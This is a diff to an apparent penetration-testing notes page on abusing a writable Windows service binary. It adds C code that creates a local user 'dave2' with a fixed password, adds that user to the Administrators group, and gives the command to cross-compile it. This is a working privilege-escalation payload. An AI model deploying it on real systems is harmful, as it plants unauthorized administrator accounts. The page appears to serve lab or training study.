@@ -61,6 +61,30 @@ Successfully processed 1 files; Failed processing 0 files
 
 **Here we see the "Users" group has Full access to modify the binary.**&#x20;
 
+
+
+## Create Malicious Binary
+
+This can be a reverse shell, or a simpler payload. For example: creating a new user.
+
+```c
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user dave2 password123! /add");
+  i = system ("net localgroup administrators dave2 /add");
+  
+  return 0;
+}
+```
+
+```c
+kali@kali:~$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+```
+
 ## Transfer Malicious Binary - iwr
 
 Our malicious binary creates a new user and adds it to Adminstrators group
